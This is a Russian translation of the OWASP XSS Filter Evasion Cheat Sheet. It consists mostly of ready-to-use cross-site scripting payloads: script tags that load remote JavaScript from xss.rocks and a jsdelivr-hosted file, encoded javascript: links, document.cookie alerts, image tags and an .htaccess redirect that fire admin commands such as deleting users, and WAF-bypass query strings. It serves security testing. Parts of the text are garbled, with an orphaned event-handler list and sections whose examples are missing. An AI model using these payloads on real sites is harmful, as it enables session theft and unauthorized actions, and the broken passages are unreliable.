    XSS Filter Evasion Cheat Sheet¶

    Введение¶

    Эта статья является руководством по тестированию межсайтового скриптинга (XSS) для специалистов в области безопасности приложений. Данная шпаргалка изначально была основана на основополагающей XSS Cheat Sheet от RSnake, ранее располагавшейся по адресу: http://ha.ckers.org/xss.html. Теперь OWASP Cheat Sheet Series предоставляет пользователям обновлённую и поддерживаемую версию этого документа. Самая первая шпаргалка OWASP, Cross Site Scripting Prevention, была вдохновлена работой RSnake, и мы благодарим RSnake за это вдохновение!

    Тесты¶

    Данная шпаргалка демонстрирует, что фильтрация входных данных является неполноценной защитой от XSS, предоставляя тестировщикам набор XSS-атак, способных обойти определённые защитные фильтры.

    Базовый XSS-тест без обхода фильтров¶

    Эта атака, использующая стандартное внедрение JavaScript через XSS, служит точкой отсчёта для данной шпаргалки (кавычки не требуются ни в одном современном браузере, поэтому здесь они опущены):

    <SCRIPT SRC=https://cdn.jsdelivr.net/gh/Moksh45/host-xss.rocks/index.js></SCRIPT>

    XSS Locator (полиглот)¶

    Этот тест содержит «полиглот-пейлоад для XSS», который выполняется в нескольких контекстах, включая HTML, строки скриптов, JavaScript и URL:

    javascript:/*--></title></style></textarea></script></xmp>
<svg/onload='+/"`/+/onmouseover=1/+/[*/[]/+alert(42);//'>

    (Основано на этом твите от Gareth Heyes).

    Некорректные теги A¶

    Этот тест пропускает атрибут href, чтобы продемонстрировать XSS-атаку с использованием обработчиков событий:

    \<a onmouseover="alert(document.cookie)"\>xxs link\</a\>

    Chrome автоматически вставляет недостающие кавычки. Если возникают проблемы, попробуйте опустить их — Chrome корректно расставит недостающие кавычки в URL или скриптах:

    \<a onmouseover=alert(document.cookie)\>xxs link\</a\>

    (Предложено David Cross, проверено в Chrome)

    Некорректные теги IMG¶

    Этот XSS-метод использует упрощённый движок рендеринга для создания XSS-вектора внутри тега IMG (который должен быть заключён в кавычки). Предполагается, что изначально такой подход был призван исправлять небрежно написанный код, однако он также значительно усложняет корректный разбор HTML-тегов:

    <IMG """><SCRIPT>alert("XSS")</SCRIPT>"\>

    (Изначально найдено Begeek, но было приведено в порядок и сокращено для работы во всех браузерах)

    fromCharCode¶

    Если система не допускает кавычки любого вида, можно воспользоваться eval() с fromCharCode в JavaScript для создания любого необходимого XSS-вектора:

    <a href="javascript:alert(String.fromCharCode(88,83,83))">Click Me!</a>

    Тег SRC по умолчанию для обхода фильтров, проверяющих домен SRC¶

    Эта атака обходит большинство фильтров по домену SRC. Внедрение JavaScript через обработчик события применимо к любому типу HTML-тегов, включая Form, Iframe, Input, Embed и другие. Это также позволяет заменять любое подходящее событие для данного типа тега, например onblur или onclick, предоставляя широкое разнообразие вариантов внедрений:

    <IMG SRC=# onmouseover="alert('xxs')">

    (Предложено David Cross, отредактировано Abdullah Hussam)

    Тег SRC по умолчанию с пустым значением¶

    <IMG SRC= onmouseover="alert('xxs')">

    Тег SRC по умолчанию полностью без значения¶

    <IMG onmouseover="alert('xxs')">

    Alert при ошибке¶

    <IMG SRC=/ onerror="alert(String.fromCharCode(88,83,83))"></img>

    Десятичные HTML-ссылки на символы¶

    Поскольку XSS-примеры, использующие директиву javascript: внутри тега <IMG, не работают в Firefox, этот подход использует десятичные HTML-ссылки на символы в качестве обходного решения:

     <a href="&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;">Click Me!</a>

    Десятичные HTML-ссылки на символы без завершающей точки с запятой¶

    Это часто эффективно для обхода XSS-фильтров, ищущих строку &\#XX;, поскольку большинство людей не знают о дополнении нулями — которое может применяться до 7 цифр включительно. Это также полезно против фильтров, декодирующих строки вроде $tmp\_string =\~ s/.\*\\&\#(\\d+);.\*/$1/;, ошибочно предполагающих, что точка с запятой обязательна для завершения HTML-закодированной строки (такое встречалось на практике):

    <a href="&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041">Click Me</a>

    Шестнадцатеричные HTML-ссылки на символы без завершающей точки с запятой¶

    Эта атака также работает против фильтра строки $tmp\_string=\~ s/.\*\\&\#(\\d+);.\*/$1/;, поскольку он предполагает, что за символом решётки следует цифра — что неверно для шестнадцатеричных HTML-символов:

    <a href="&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29">Click Me</a>

    Встроенная табуляция¶

    Этот подход разрывает XSS-атаку:

     <a href="jav   ascript:alert('XSS');">Click Me</a>

    Встроенная закодированная табуляция¶

    Этот подход также может разрывать XSS:

     <a href="jav&#x09;ascript:alert('XSS');">Click Me</a>

    Встроенный перевод строки для разрыва XSS¶

    Хотя некоторые защитники утверждают, что для этой атаки подойдут любые символы с кодами 09–13 (десятичные), это неверно. Работают только 09 (горизонтальная табуляция), 10 (перевод строки) и 13 (возврат каретки). Для справки см. таблицу ASCII. Следующие четыре примера XSS-атак иллюстрируют этот вектор:

    <a href="jav&#x0A;ascript:alert('XSS');">Click Me</a>

    Пример 1: разрыв XSS-атаки с помощью встроенного возврата каретки¶

    (Замечание: в приведённых выше примерах строки намеренно длиннее необходимого, поскольку нули можно опускать. Часто встречаются фильтры, предполагающие, что шестнадцатеричное и десятичное кодирование должно содержать два или три символа. Фактическое правило — от 1 до 7 символов.):

    <a href="jav&#x0D;ascript:alert('XSS');">Click Me</a>

    Пример 2: разрыв JavaScript-директивы с помощью нулевого символа¶

    Нулевые символы также работают как XSS-векторы, но иначе, чем в примере выше: их нужно вставлять напрямую — например, через Burp Proxy, или используя %00 в строке URL. Если вы хотите написать собственный инструмент для внедрения, можно воспользоваться vim (^V^@ создаст нулевой символ) или следующей программой для записи в текстовый файл. Нулевой символ %00 значительно полезнее и помог мне обойти ряд реальных фильтров с вариациями этого примера:

    perl -e 'print "<IMG SRC=java\0script:alert(\"XSS\")>";' > out

    Пример 3: пробелы и мета-символы перед JavaScript в изображениях для XSS¶

    Это полезно, если шаблон фильтра не учитывает пробелы в слове javascript:, что корректно, поскольку это не отрисуется, но приводит к ошибочному предположению, что между кавычкой и ключевым словом javascript: не может быть пробела. На самом деле допустим любой символ с десятичным кодом от 1 до 32:

    <a href=" &#14;  javascript:alert('XSS');">Click Me</a>

    Пример 4: XSS без буквенно-цифровых символов¶

    Парсер HTML в Firefox считает, что символ, не являющийся буквой или цифрой, после ключевого слова HTML недопустим, и поэтому воспринимает его как пробел или недопустимый токен после HTML-тега. Проблема в том, что некоторые XSS-фильтры предполагают, что искомый тег разделён пробелами. Например, \<SCRIPT\\s != \<SCRIPT/XSS\\s:

    <SCRIPT/XSS SRC="http://xss.rocks/xss.js"></SCRIPT>

    Основываясь на той же идее, но расширяя её с помощью фаззера Rsnake. Движок рендеринга Gecko допускает любой символ, кроме букв, цифр и символов-ограничителей (таких как кавычки, угловые скобки и т. д.), между обработчиком события и знаком равенства, что упрощает обход блокировок межсайтового скриптинга. Обратите внимание, что это также относится к символу обратного апострофа, как показано здесь:

    <BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=alert("XSS")>

    Yair Amit отметил, что между движками рендеринга Trident (IE) и Gecko (Firefox) есть небольшое различие в поведении, позволяющее использовать просто косую черту между тегом и параметром без пробелов. Это может быть полезно в атаке, если система не допускает пробелы:

    <SCRIPT/SRC="http://xss.rocks/xss.js"></SCRIPT>

    Лишние открывающие угловые скобки¶

    Этот XSS-вектор способен обмануть определённые движки обнаружения, которые работают путём поиска совпадающих пар открывающих и закрывающих угловых скобок с последующим сравнением тега внутри, вместо использования более эффективного алгоритма, такого как Boyer-Moore, ищущего полные совпадения строк для открывающей угловой скобки и связанного тега (разумеется, после деобфускации). Двойной слэш комментирует завершающую лишнюю скобку, подавляя ошибку JavaScript:

    <<SCRIPT>alert("XSS");//\<</SCRIPT>

    (Предложено Franz Sedlmaier)

    Отсутствие закрывающих тегов script¶

    В Firefox часть \></SCRIPT> этого XSS-вектора на самом деле не нужна, поскольку Firefox предполагает, что безопасно закрыть HTML-тег, и добавляет закрывающие теги самостоятельно. В отличие от следующей атаки, которая не работает в Firefox, этот метод не требует дополнительного HTML-кода ниже по документу. При необходимости можно добавить кавычки, но обычно они не нужны:

    <SCRIPT SRC=http://xss.rocks/xss.js?< B >

    Разрешение протокола в тегах script¶

    Этот конкретный вариант частично основан на обходе разрешения протокола от Ozh (описан ниже) и работает в IE и Edge в режиме совместимости. Однако он особенно полезен, когда важна экономия места, и, конечно, чем короче ваш домен, тем лучше. Расширение .j допустимо независимо от типа кодирования, поскольку браузер понимает его в контексте тега SCRIPT:

    <SCRIPT SRC=//xss.rocks/.j>

    (Предложено Łukasz Pilorz)

    Полуоткрытый HTML/JavaScript XSS-вектор¶

    В отличие от Firefox, движок рендеринга IE (Trident) не добавляет лишние данные на страницу, но допускает директиву javascript: в изображениях. Это полезно как вектор, поскольку не требует закрывающей угловой скобки. Предполагается наличие какого-либо HTML-тега ниже точки внедрения этого XSS-вектора. Даже при отсутствии закрывающего тега \> теги ниже по документу закроют его. Примечание: это может нарушить HTML в зависимости от того, что находится ниже. Вектор обходит следующее регулярное выражение системы обнаружения сетевых вторжений (NIDS): /((\\%3D)|(=))\[^\\n\]\*((\\%3C)|\<)\[^\\n\]+((\\%3E)|\>)/ — поскольку не требует завершающего \>. Как дополнительное замечание: этот вектор также был эффективен против реального XSS-фильтра с использованием незакрытого тега <IFRAME вместо тега <IMG.

    <IMG SRC="`<javascript:alert>`('XSS')"

    Экранирование JavaScript-экранирования¶

    Если приложение написано так, что выводит пользовательские данные внутрь JavaScript (например: <SCRIPT>var a="$ENV{QUERY\_STRING}";</SCRIPT>) и вы хотите внедрить туда свой JavaScript, но серверное приложение экранирует определённые кавычки, можно обойти это, экранировав их символ экранирования. При внедрении это будет выглядеть как <SCRIPT>var a="\\\\";alert('XSS');//";</SCRIPT>, что в итоге снимает экранирование с двойных кавычек и приводит к срабатыванию XSS-вектора. XSS-локатор использует этот метод:

    \";alert('XSS');//

    Альтернативный вариант — если к встроенным данным применено корректное экранирование JSON или JavaScript, но не HTML-кодирование — завершить блок скрипта и начать свой:

    </script><script>alert('XSS');</script>

    • onTimeError() (пользователь или злоумышленник устанавливает свойство времени, например dur, в недопустимое значение)
    • onTrackChange() (пользователь или злоумышленник меняет трек в плейлисте)
    • onUndo() (пользователь перешёл назад в истории отмены действий)
    • onUnload() (когда пользователь кликает по любой ссылке или нажимает кнопку «Назад», или злоумышленник принудительно выполняет клик)
    • onURLFlip() (это событие срабатывает, когда ASF-файл (Advanced Streaming Format), воспроизводимый медиа-тегом HTML+TIME (Timed Interactive Multimedia Extensions), обрабатывает скриптовые команды, встроенные в ASF-файл)
    • seekSegmentTime() (это метод, который находит указанную точку на сегментной временно́й шкале элемента и начинает воспроизведение с этой точки. Сегмент состоит из одного повторения временно́й шкалы, включая обратное воспроизведение с атрибутом AUTOREVERSE.)

    Удалённая таблица стилей¶

    Используя нечто столь же простое, как удалённая таблица стилей, можно включить XSS, поскольку параметр style можно переопределить с помощью встроенного выражения. Это работает только в IE. Обратите внимание, что на странице нет ничего, указывающего на наличие встроенного JavaScript. Примечание: во всех примерах с удалёнными таблицами стилей используется тег body, поэтому атака не сработает, если на странице нет никакого содержимого, кроме самого вектора — нужно добавить хотя бы один символ на страницу, если она полностью пустая:

    <LINK REL="stylesheet" HREF="http://xss.rocks/xss.css">

    Удалённая таблица стилей, часть 2¶

    Работает так же, как выше, но использует тег <STYLE> вместо тега <LINK>. Незначительная вариация этого вектора была использована для взлома Google Desktop. Как дополнительное замечание: закрывающий тег </STYLE> можно убрать, если непосредственно после вектора следует HTML-код, который его закроет. Это полезно, если в XSS-атаке нельзя использовать знак равенства или косую черту — такое встречалось в реальных случаях:

    <STYLE>@import'http://xss.rocks/xss.css';</STYLE>

    US-ASCII кодирование¶

    Эта атака использует некорректное ASCII-кодирование с 7 битами вместо 8. Данный XSS-метод может обойти многие контент-фильтры, но работает только если хост передаёт данные в кодировке US-ASCII или если вы задаёте кодировку самостоятельно. Это более полезно для обхода XSS-фильтрации в WAF (Web Application Firewall), чем для обхода серверных фильтров. Apache Tomcat является единственным известным сервером, который по умолчанию всё ещё передаёт данные в кодировке US-ASCII.

    META¶

    Особенность meta refresh состоит в том, что он не отправляет referrer в заголовке — поэтому его можно использовать для определённых типов атак, когда необходимо скрыть URL источника перехода:

    <META HTTP-EQUIV="refresh" CONTENT="0;url=javascript:alert('XSS');">

    META с использованием Data¶

    Схема URL с директивой data. Этот метод атаки хорош тем, что в нём нет ничего видимого, содержащего слово SCRIPT или JavaScript-директиву, поскольку используется base64-кодирование. Подробнее см. RFC 2397.

    <META HTTP-EQUIV="refresh" CONTENT="0;url=data:text/html base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K">

    META с дополнительным параметром URL¶

    Если целевой сайт пытается проверить, начинается ли URL с <http://>;, можно обойти это правило фильтрации следующим образом:

    <META HTTP-EQUIV="refresh" CONTENT="0; URL=http://;URL=javascript:alert('XSS');">

    (Предложено Moritz Naumann)

    Скрытый блок Downlevel¶

    Работает только в движке рендеринга IE — Trident.     Тег BASE¶

    (Работает в IE в безопасном режиме) Эта атака требует // для комментирования последующих символов, чтобы не возникла ошибка JavaScript и XSS-тег отрисовался. Кроме того, атака основывается на том, что многие сайты используют динамически подставляемые пути к изображениям вроде images/image.jpg, а не полные пути.     <BASE HREF="javascript:alert('XSS');//">

    Для использования этого XSS-вектора требуется установленный SSI на сервере. Вероятно, нет необходимости упоминать, что если вы можете выполнять команды на сервере, там наверняка есть значительно более серьёзные проблемы:

    IMG со встроенными командами¶

    Эта атака работает только при внедрении (например, на веб-доске) в веб-страницу, защищённую паролем, если эта защита работает и с другими командами на том же домене. Может использоваться для удаления пользователей, добавления пользователей (если посетитель страницы является администратором), отправки учётных данных на другой адрес и т. д. Это один из менее используемых, но более полезных XSS-векторов:

    <IMG SRC="http://www.thesiteyouareon.com/somecommand.php?somevariables=maliciouscode">

    IMG со встроенными командами, часть II¶

    Это ещё более опасный вариант, поскольку в нём абсолютно нет идентификаторов, выглядящих подозрительно, за исключением того, что он размещён не на вашем домене. Вектор использует ответы 302 или 304 (другие тоже работают) для перенаправления изображения обратно на команду. Таким образом, обычный <IMG SRC="httx://badguy.com/a.jpg"> может оказаться вектором атаки для выполнения команд от имени пользователя, просматривающего ссылку на изображение. Вот строка .htaccess (для Apache) для реализации этого вектора:

    Redirect 302 /a.jpg http://victimsite.com/admin.asp&deleteuser

    (Благодарим Timo за часть этого примера)

    XSS с использованием инкапсуляции HTML-кавычек¶

    Эта атака изначально тестировалась в IE, поэтому результаты могут отличаться. Для осуществления XSS на сайтах, допускающих <SCRIPT>, но запрещающих <SCRIPT SRC... с помощью regex-фильтра /\<script\[^\>\]+src/i, используйте следующее:

    <SCRIPT a=">" SRC="httx://xss.rocks/xss.js"></SCRIPT>

    Для XSS на сайтах, допускающих <SCRIPT>, но запрещающих \<script src... из-за regex-фильтра /\<script((\\s+\\w+(\\s\*=\\s\*(?:"(.)\*?"|'(.)\*?'|\[^'"\>\\s\]+))?)+\\s\*|\\s\*)src/i (это важно, поскольку такое регулярное выражение встречалось в реальных системах):

    <SCRIPT =">" SRC="httx://xss.rocks/xss.js"></SCRIPT>

    Ещё один XSS для обхода того же фильтра: /\<script((\\s+\\w+(\\s\*=\\s\*(?:"(.)\*?"|'(.)\*?'|\[^'"\>\\s\]+))?)+\\s\*|\\s\*)src/i:

    <SCRIPT a=">" '' SRC="httx://xss.rocks/xss.js"></SCRIPT>

    Ещё один XSS, обходящий тот же фильтр: /\<script((\\s+\\w+(\\s\*=\\s\*(?:"(.)\*?"|'(.)\*?'|\[^'"\>\\s\]+))?)+\\s\*|\\s\*)src/i

    В целом мы не обсуждаем методы защиты, но единственное, что останавливает этот XSS-пример, если вы хотите допускать теги <SCRIPT>, но запрещать удалённые скрипты — это конечный автомат (и, конечно, есть другие способы обойти это, если допускаются теги <SCRIPT>), используйте:

    <SCRIPT "a='>'" SRC="httx://xss.rocks/xss.js"></SCRIPT>

    И последний XSS для обхода /\<script((\\s+\\w+(\\s\*=\\s\*(?:"(.)\*?"|'(.)\*?'|\[^'"\>\\s\]+))?)+\\s\*|\\s\*)src/i с использованием обратных апострофов (не работает в Firefox):

    <SCRIPT a=`>` SRC="httx://xss.rocks/xss.js"></SCRIPT>

    Пример XSS, который работает, если regex не ищет совпадающую пару кавычек, а вместо этого находит любые кавычки для некорректного завершения строки параметра:

    <SCRIPT a=">'>" SRC="httx://xss.rocks/xss.js"></SCRIPT>

    Этот XSS по-прежнему вызывает беспокойство, поскольку практически невозможно остановить его без блокировки всего активного контента:

    Дополнительная точка для абсолютного DNS:

    <A HREF="http://www.google.com./">XSS</A>

    Расположение ссылки в JavaScript¶

    <A HREF="javascript:document.location='http://www.google.com/'">XSS</A>

    Замена содержимого как вектор атаки¶

    Предположим, что http://www.google.com/ программно заменяется на пустую строку. Аналогичный вектор атаки применялся против нескольких реальных XSS-фильтров с использованием самого фильтра преобразования (вот пример): java&\#x09;script: преобразовывалось в java script:, что отрисовывается в IE:

    <A HREF="http://www.google.com/ogle.com/">XSS</A>

    Содействие XSS с помощью HTTP Parameter Pollution¶

    Если функция обмена контентом на сайте реализована, как показано ниже, эта атака сработает. Есть страница Content, включающая некоторый пользовательский контент, а также ссылку на страницу Share, позволяющую пользователю выбрать предпочтительную платформу для публикации. Разработчики HTML-кодировали параметр title на странице Content для защиты от XSS, но по каким-то причинам не URL-кодировали его для предотвращения HTTP Parameter Pollution. В итоге они решили, что поскольку значение content_type является константой и всегда будет целым числом, кодирование или валидация content_type на странице Share не нужна.

    Исходный код страницы Content¶

    a href="/Share?content_type=1&title=<%=Encode.forHtmlAttribute(untrusted content title)%>">Share</a>

    Исходный код страницы Share¶

    <script>
var contentType = <%=Request.getParameter("content_type")%>;
var title = "<%=Encode.forJavaScript(request.getParameter("title"))%>";
...
//some user agreement and sending to server logic might be here
...
</script>

    Вывод страницы Content¶

    Если злоумышленник установит ненадёжный заголовок контента как This is a regular title&content_type=1;alert(1), ссылка на странице Content будет следующей:

    <a href="/share?content_type=1&title=This is a regular title&amp;content_type=1;alert(1)">Share</a>

    Вывод страницы Share¶

    А вывод страницы Share может быть таким:

    <script>
var contentType = 1; alert(1);
var title = "This is a regular title";
…
//some user agreement and sending to server logic might be here
…
</script>

    В результате основной уязвимостью в этом примере является доверие к content_type на странице Share без надлежащего кодирования или валидации. HTTP Parameter Pollution может усиливать влияние XSS-уязвимости, преобразуя её из отражённого XSS в хранимый XSS.

    Общие проблемы¶

    Хранимый XSS¶

    Если злоумышленнику удалось протолкнуть XSS через фильтр, WAF не сможет предотвратить проведение атаки.

    Отражённый XSS в JavaScript¶

    Пример:

    <script> ... setTimeout(\\"writetitle()\\",$\_GET\[xss\]) ... </script>

    Эксплуатация:

    /?xss=500); alert(document.cookie);//

    DOM-based XSS¶

    Пример:

    <script> ... eval($\_GET\[xss\]); ... </script>

    Эксплуатация:

    /?xss=document.cookie

    XSS через перенаправление запроса¶

    Уязвимый код:

    ...
header('Location: '.$_GET['param']);
...

    А также:

    ...
header('Refresh: 0; URL='.$_GET['param']);
...

    Этот запрос не пройдёт через WAF:

    /?param=<javascript:alert(document.cookie>)

    Этот запрос пройдёт через WAF и в определённых браузерах будет проведена XSS-атака:

    /?param=<data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=
